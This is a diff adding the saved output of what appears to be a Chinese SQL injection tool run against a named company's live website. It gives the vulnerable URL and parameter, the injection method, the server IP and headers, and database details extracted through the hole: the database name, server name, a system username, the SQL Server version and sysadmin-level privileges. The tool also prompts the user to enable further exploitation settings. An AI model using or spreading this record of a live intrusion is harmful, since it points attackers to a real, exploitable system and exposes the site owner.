@@ -1,0 +1,61 @@
+■漏洞信息:============================================================
+ ·URL:http://www.nord-lock.com/default.asp?url=347.29.37
+ ·页面标题：Nord-Lock  - &#54924;&#49324;&#49548;&#44060;
+ ·参数:url=347.29.37
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:212.247.44.241
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 10:15:28 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 12527
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAQARASTB=KBILHCJALMPHACHNNGDEBIEH; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：evosite_system
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SPESQL01
+- 服务名：MSSQLSERVER
+- 系统用户名：mattias
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
